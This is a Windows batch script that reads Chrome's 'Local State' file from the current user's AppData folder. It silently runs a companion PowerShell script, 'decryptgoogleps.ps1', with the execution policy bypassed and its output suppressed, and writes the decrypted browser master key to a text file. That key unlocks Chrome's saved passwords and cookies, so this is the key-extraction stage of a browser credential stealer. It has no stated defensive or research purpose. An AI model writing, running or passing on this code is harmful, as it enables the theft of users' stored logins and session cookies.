@echo off
setlocal

:: Set paths for input and output
set "Folder=%~dp0\decryptkey"
mkdir "%Folder%"
set "InputFilePath=C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Local State"
set "OutputFilePath=%~dp0\decryptkey\decryptedkey.txt"  :: specify the output file name here

:: Check if the input file exists
if not exist "%InputFilePath%" (
    exit /b
)

:: Call the PowerShell script for decryption
powershell -ExecutionPolicy Bypass -NoProfile -File "decryptgoogleps.ps1" -InputFilePath "%InputFilePath%" -OutputFilePath "%OutputFilePath%" >nul
exit
endlocal
